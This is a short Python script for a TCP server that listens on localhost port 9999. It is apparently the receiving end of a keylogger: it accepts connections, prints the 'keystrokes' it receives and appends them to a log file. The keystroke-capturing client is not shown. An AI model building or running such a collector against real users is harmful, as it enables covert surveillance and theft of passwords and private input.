import socket

# Server IP and port
HOST = '127.0.0.1'
PORT = 9999

# Path to the log file
log_file_path = "D:\keylog.txt"

# Function to start the server and listen for connections
def start_server():
    # Create a TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the specified IP and port
    server_socket.bind((HOST, PORT))

    # Start listening for incoming connections
    server_socket.listen(5)
    print(f"Server listening on {HOST}:{PORT}...")

    while True:
        # Accept a client connection
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        # Receive the data (keystrokes) from the client
        data = client_socket.recv(1024).decode()
        print(f"Received keystrokes: {data}")

        # Write the received data to the log file
        with open(log_file_path, 'a') as log_file:
            log_file.write(data + '\n')

        # Close the connection
        client_socket.close()

if __name__ == "__main__":
    start_server()

